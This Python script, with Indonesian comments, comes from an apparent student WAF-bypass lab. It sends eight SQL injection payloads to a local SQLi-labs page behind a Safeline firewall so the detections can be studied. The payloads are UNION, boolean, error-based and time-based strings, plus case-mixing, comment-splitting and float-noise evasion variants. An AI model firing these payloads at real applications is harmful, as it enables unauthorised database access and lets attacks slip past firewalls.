"""
bypass_lab/verify_log.py
=========================
Kirim beberapa payload ke Safeline supaya attack log terisi,
lalu kita analisis dari UI apa yang di-detect.

Run:
    python3 -m bypass_lab.verify_log
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

WAF = "http://localhost:8888/Less-1/"

payloads = [
    ("UNION SELECT standard",    "-1' UNION SELECT database(),'X','Y'-- -"),
    ("UNION case",               "-1' uNiOn sElEcT database(),'X','Y'-- -"),
    ("AND 1=1",                  "1' AND 1=1-- -"),
    ("EXTRACTVALUE",             "1' AND EXTRACTVALUE(1,database())-- -"),
    ("SLEEP",                    "1' AND SLEEP(1)-- -"),
    ("OR boolean",               "1' OR '1'='1"),
    ("comment split",            "-1' UN/**/ION SE/**/LECT database(),'X','Y'-- -"),
    ("float noise",              "-1'.6e0 UNION SELECT database(),'X','Y'-- -"),
]

print("Sending payloads to Safeline — check UI Attacks tab after this...\n")
for label, p in payloads:
    r = requests.get(WAF, params={"id": p}, timeout=8)
    print(f"  [{r.status_code}] {label}")
    time.sleep(0.5)

print("\nDone. Buka https://localhost:9443 → Attacks → klik salah satu entry")
print("Lihat: attack_type, confidence, matched_part → paste ke sini")
